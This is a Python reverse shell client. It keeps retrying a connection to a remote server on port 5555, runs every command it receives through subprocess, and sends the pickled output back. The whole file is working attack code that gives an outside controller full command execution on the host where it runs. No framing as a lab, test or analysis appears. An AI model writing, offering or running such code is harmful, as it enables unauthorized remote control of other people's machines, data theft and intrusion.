## Importing our dependencies from the python standard library
from socket import *
from subprocess import getstatusoutput
from pickle import dumps

def client(ip):

    while True:
        try:
            ## Starts the socket instance and connects to the server using ip address $ip on
            ## port $port. It ensures the connection is successfull else the program
            ## is terminated.
            client = socket(AF_INET, SOCK_STREAM)
            client.connect((ip, 5555))
            break

        except:
            continue

    while True:
        ## The main loop receives commands from the connected client,
        ## executes the commands and replies with the commands output
        data = client.recv(1024)
        command = data.decode('utf-8')
            
        if command.strip() == 'quit':
            quit(0)

        else:
            info = getstatusoutput(command)
            client.sendall(dumps(info))


if __name__ == '__main__':
    ## Execution begins here
    ## Invokes the client function with the parameter ip.
    ## This function is responsible for connecting to the server, receiving
    ## commands, running the commands and then sending the output back to 
    ## the server.
    client('0.0.0.0')
